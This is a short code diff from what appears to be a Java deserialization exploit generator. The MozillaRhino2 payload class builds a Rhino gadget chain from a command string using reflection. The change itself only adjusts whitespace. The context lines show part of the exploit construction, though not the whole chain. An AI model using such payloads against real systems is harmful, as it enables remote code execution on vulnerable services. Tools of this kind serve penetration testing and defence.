@@ -55,7 +55,7 @@ public class MozillaRhino2 implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(String command) throws Exception {
-        ScriptableObject    dummyScope       = new Environment();
+        ScriptableObject dummyScope = new Environment();
         Map<Object, Object> associatedValues = new Hashtable<Object, Object>();
         associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
         Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
@@ -67,7 +67,7 @@ public class MozillaRhino2 implements ObjectPayload<Object> {
                 new Object[]{Context.class.getMethod("enter")});
 
         ScriptableObject initContextScriptableObject = new Environment();
-        Method           makeSlot                    = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
+        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
         Reflections.setAccessible(makeSlot);
         Object slot = makeSlot.invoke(initContextScriptableObject, "QI4L", 0, 4);
         Reflections.setFieldValue(slot, "getter", initContextMemberBox);
